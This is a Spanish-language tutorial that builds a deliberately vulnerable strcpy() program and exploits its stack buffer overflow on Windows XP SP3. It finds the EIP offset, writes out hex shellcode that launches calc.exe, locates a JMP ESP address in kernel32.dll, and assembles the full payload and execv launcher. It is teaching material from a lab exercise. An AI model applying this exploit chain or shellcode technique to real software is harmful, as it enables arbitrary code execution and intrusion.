Empezamos creando un programa que sea vulnerable, en este caso vamos a utilizar la función `strcpy()`.

El código en c, lo encontraréis en `vulnerable.c`.

Cadena a pasar, el EIP nos da 42424242 por los últimos 4 dígitos, ya que la B en hexadecimal se representa como 42.
```c
argv = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```
La forma más fácil de encontrar dónde se desborda el buffer es metiendo caracteres de 4 en 4, es decir:
```c
argv = AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR
```
Ya tenemos nuestro programa vulnerable, el cual se desborda a partir de la primera B o si nos ayudamos de la segunda cadena, se desbordará en la R. Ahora tenemos que hacer con la ayuda de C y Ensamblador, el programa que abra directamente la calculadora, para ello cargamos la librería msvcrt.dll, la cual se utiliza para funciones de C como el printf, el memcpy y muchas más, además de controlar muchos procesos del propio sistema operativo. 

El código que he utilizado lo podéis encontrar en `shellcode.c`, en el cual es importante cambiar las direcciones de memorias de LoadLibraryA y de system. Para encontrar estas direcciones de memorias nos ayudaremos de un pequeño script que encuentras en el foro de [elhacker.net](http://foro.elhacker.net/index.php/topic,56137.0.html)

A la hora de utilizarlo nos dará como resultado algo de este estilo:
```bash
C:\Documents and Settings\Windows\My Documents>offset.exe kernel32.dll LoadLibraryA
Offset de LoadLibraryA en la DLL kernel32.dll es 7c801d7b

C:\Documents and Settings\Windows\My Documents>offset.exe msvcrt.dll system
Offset de system en la DLL msvcrt.dll es 77c293c7
```
Agregaremos estas direcciones a nuestro shellcode.c, compilamos el código y tras ello, convertiremos el shellcode.obj en hex.
```bash
xxd -i shellcode.obj > shellcode.hex
```
Ahora buscamos el inicio del código ensamblador, que es "push ebp", que en hexadecimal se traduce a `0x55, 0x8b`, encontremos varias y nos tenemos que quedar con las dos acabadas en `0xd3` que corresponde con la llamada a `call ebx`. Así tendríamos las dos partes del código ensamblador, la primera que corresponde a la llamada a la librería `msvcrt.dll` y la segunda a la calculadora, es decir, `calc.exe`

Nos queda algo como esto:
```hex
																  0x55,
0x8b, 0xec, 0x33, 0xff, 0x57, 0x83, 0xec, 0x0c, 0xc6, 0x45, 0xf5, 0x6d,
0xc6, 0x45, 0xf6, 0x73, 0xc6, 0x45, 0xf7, 0x76, 0xc6, 0x45, 0xf8, 0x63,
0xc6, 0x45, 0xf9, 0x72, 0xc6, 0x45, 0xfa, 0x74, 0xc6, 0x45, 0xfb, 0x2e,
0xc6, 0x45, 0xfc, 0x64, 0xc6, 0x45, 0xfd, 0x6c, 0xc6, 0x45, 0xfe, 0x6c,
0x8d, 0x45, 0xf5, 0x50, 0xbb, 0x7b, 0x1d, 0x80, 0x7c, 0xff, 0xd3, 0x55,
0x8b, 0xec, 0x33, 0xff, 0x57, 0x83, 0xec, 0x08, 0xc6, 0x45, 0xf7, 0x63,
0xc6, 0x45, 0xf8, 0x61, 0xc6, 0x45, 0xf9, 0x6c, 0xc6, 0x45, 0xfa, 0x63,
0xc6, 0x45, 0xfb, 0x2e, 0xc6, 0x45, 0xfc, 0x65, 0xc6, 0x45, 0xfd, 0x78,
0xc6, 0x45, 0xfe, 0x65, 0x8d, 0x45, 0xf7, 0x50, 0xbb, 0xc7, 0x93, 0xc2,
0x77, 0xff, 0xd3
```
Y ahora sustituimos los "0x" por "\x" y eliminamos todos los espacios y "\n" para convertirlo en bytes, que no se nos olvide quitar las comas, y quedaría algo como esto:
```byte
\x55\x8b\xec\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3\x55\x8b\xec\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff\xd3
```
Ya tenemos nuestro shellcode, ahora tenemos que inyectarlo en nuestro programa vulnerable, para hacer esto, en vez de solo meter `AAAAA...AAA` en la cadena, vamos a meter de 4 en 4 letras, tal que, `AAAABBBBCCCCDDDD...FFFFGGGG` y con ayuda del debugger, buscaremos el resultado de nuestro `EIP` y así sabremos dónde ocurre nuestro desbordamiento, en mi caso ocurre en `RRRR`, nuestro `EIP` o código de rror al ejecutar marcaría `52525252`, ya que es la traducción a hexadecimal de `RRRR`. Si eliminamos de la cadena las `RRRR` y ejecutamos el programa, cambiaría nuestro código de error a `00001000` 

Ahora tenemos que incluir nuestro shellcode, pero como las direcciones de pila cambian constantemente y además contienen un 00 al principio, y nuestro programa se pararía al encontrar un 0. Necesitamos hacer que nuestro `EIP` salte a una dirección de memoria de un `JMP ESP` o `CALL ESP` y así se ejecutaría nuestro shellcode.

Voy a utilizar un programa que me va a ayudar a buscar la dirección de memoria a la que debe saltar, su nombre es `findjmp` y lo encontramos en:
 - [Hecho por Ryan de eeye](https://github.com/nickvido/littleoldearthquake/blob/master/corelan/findjmp/findjmp2.c)
 
 Usamos el siguiente comando para sacar las direcciones de memoria
```bash
findjmp kernel32.dll esp
```
Y deberíamos de tener algo como esto:
```bash
C:\Documents and Settings\Windows\My Documents>findjmp2.exe kernel32.dll esp

Findjmp, Eeye, I2S-LaB
Findjmp2, Hat-Squad
Scanning kernel32.dll for code useable with the esp register
0x7C8369F0      call esp
0x7C86467B      jmp esp
0x7C868667      call esp
Finished Scanning kernel32.dll for code useable with the esp register
Found 3 usable addresses
```
Hemos encontrado directamente un `JMP ESP`, si no logramos encontrarlo en la librería kernel32.dll, tendremos que seguir buscando dependiendo de nuestra versión, en mi caso utilizo WinXP SP3.

Una vez encontrada la llamada, y teniendo todos los datos anteriores, es momento de crear nuestro payload.

Para crear nuestro payload, empezaremos cambiando la dirección de memoria de la `JMP ESP` a bytes, en mi caso sería:
```c
Dirección de memoria: "0x7C86467B"
Cambiado a bytes: "\x7B\x46\x86\x7C"
```
Ya tenemos una parte de nuestro payload, la dirección de memoria a la que saltar, ahora necesitamos añadir nuestro shellcode y luego nuestra cadena, de forma que:
```c
Cadena = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ"
jmp_esp = "\x7B\x46\x86\x7C"
shellcode = "\x55\x8b\xec\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3\x55\x8b\xec\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff\xd3"
```
Teniendo todo, nos ayudaremos de strcat para concatenar las cadenas, tal que:
```c
strcat(payload, jmpesp);
// "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ\x7B\x46\x86\x7C"
strcat(payload, shellcode);
//"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ\x7B\x46\x86\x7C\x55\x8b\xec\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3\x55\x8b\xec\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff\xd3"
```
Así quedaría nuestro payload, preparado para ejecutarlo dentro de nuestro programa vulnerable, para ello nos ayudamos de execv, que nos permite realizar una ejecución de comandos. Guardamos los argumentos que vamos a necesitar en una variable.
```c
char	*args[3];

args[0] = "vulnerable.exe"; // programa a ejecutar
args[1] = payload; // argumentos que vamos a pasarle al programa vulnerable
args[2] = NULL; // pasamos nulo porque no metemos más argumentos
```
Una vez definidos, llamamos a execv.
```c
execv("vulnerable.exe", args);
// pasamos el nombre del programa a ejecutar primero junto a los argumentos que queremos que ejecute.
```
Y ya tendríamos todo hecho, solo queda ejecutarlo y ver como se abre nuestra calculadora :D!